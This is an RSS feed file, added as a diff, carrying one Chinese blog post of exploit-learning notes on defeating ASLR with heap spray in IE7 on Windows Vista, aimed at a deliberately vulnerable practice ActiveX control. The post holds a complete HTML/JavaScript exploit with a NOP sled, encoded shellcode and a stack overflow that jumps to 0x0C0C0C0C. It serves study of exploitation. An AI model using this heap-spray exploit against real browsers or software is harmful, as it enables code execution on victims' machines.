@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>堆喷射 on Misaka的秘密花园</title><link>https://blog.moeomu.com/zh-cn/tags/%E5%A0%86%E5%96%B7%E5%B0%84/</link><description>Recent content in 堆喷射 on Misaka的秘密花园</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sat, 28 Nov 2020 12:38:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/zh-cn/tags/%E5%A0%86%E5%96%B7%E5%B0%84/index.xml" rel="self" type="application/rss+xml"/><item><title>漏洞利用学习笔记-019-利用HeapSpray攻击ASLR</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/</link><pubDate>Sat, 28 Nov 2020 12:38:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/</guid><description>&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-019-%e5%88%a9%e7%94%a8heapspray%e6%94%bb%e5%87%bbaslr/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;p>通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。只要运气不要差到0x0C0C0C0C刚好位于shellcode中的某个位置，shellcode就可以成功执行&lt;/p>
+&lt;h2 id="实验">实验&lt;/h2>
+&lt;h3 id="准备工作">准备工作&lt;/h3>
+&lt;blockquote>
+&lt;p>环境：系统：Windows Vista SP0，DEP状态：默认，浏览器：IE7&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>还是将之前用过的&lt;a class="link" href="https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX.ocx" target="_blank" rel="noopener"
+>Vulner_AX.dll&lt;/a>作为攻击目标&lt;/li>
+&lt;li>&lt;code>VulnerAX.idl&lt;/code>中&lt;code>CVulnerAXCtrl的类信息&lt;/code>的UUID：&lt;code>ACA3927C-6BD1-4B4E-8697-72481279AAEC&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="思想">思想&lt;/h3>
+&lt;ul>
+&lt;li>我们利用Heap spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理&lt;/li>
+&lt;li>每个内存块中包含着0x90填充和shellcode&lt;/li>
+&lt;li>Heap spray结束后我们会占领&lt;code>0x0C0C0C0C&lt;/code>附近的内存，我们只要控制程序转入&lt;code>0x0C0C0C0C&lt;/code>执行，在经过若干个0x90滑行之后就可以到达shellcode范围并执行&lt;/li>
+&lt;li>test函数中存在一个典型的溢出漏洞，通过复制超长字符串可以覆盖函数返回地址&lt;/li>
+&lt;li>我们将函数返回地址覆盖为&lt;code>0x0C0C0C0C&lt;/code>，在函数执行返回执行后就会转入我们申请的内存空间中&lt;/li>
+&lt;/ul>
+&lt;h3 id="代码">代码&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">nops&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unescape&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;%u9090%u9090&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">nops&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nops&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">nops&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nops&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nops&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">shellcode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nops&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nops&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">shellcode&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">memory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Array&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">memory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">nops&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">object&lt;/span> &lt;span class="na">classid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&amp;#34;&lt;/span> &lt;span class="na">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">object&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">54&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u9090&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">s&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="s2">&amp;#34;\u0C0C\u0C0C&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">test&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="结果">结果&lt;/h3>
+&lt;ul>
+&lt;li>成功攻击ASLR，如图&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p1.png"
+width="1120"
+height="585"
+srcset="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p1_hu306802ab434c2aad8293a2e9360f3b6a_67890_480x0_resize_box_3.png 480w, https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p1_hu306802ab434c2aad8293a2e9360f3b6a_67890_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="pic1"
+class="gallery-image"
+data-flex-grow="191"
+data-flex-basis="459px"
+>&lt;br>
+&lt;img src="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p2.jpg"
+width="1110"
+height="684"
+srcset="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p2_hu408cf94d4595fb0aca671dda2088e7b7_228081_480x0_resize_q75_box.jpg 480w, https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p2_hu408cf94d4595fb0aca671dda2088e7b7_228081_1024x0_resize_q75_box.jpg 1024w"
+loading="lazy"
+alt="pic2"
+class="gallery-image"
+data-flex-grow="162"
+data-flex-basis="389px"
+>&lt;br>
+&lt;img src="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p3.png"
+width="974"
+height="629"
+srcset="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p3_hud087df33f093fd774c8d8fc13f810bd8_123886_480x0_resize_box_3.png 480w, https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-019-%E5%88%A9%E7%94%A8heapspray%E6%94%BB%E5%87%BBaslr/p3_hud087df33f093fd774c8d8fc13f810bd8_123886_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="pic3"
+class="gallery-image"
+data-flex-grow="154"
+data-flex-basis="371px"
+>&lt;/p></description></item></channel></rss>
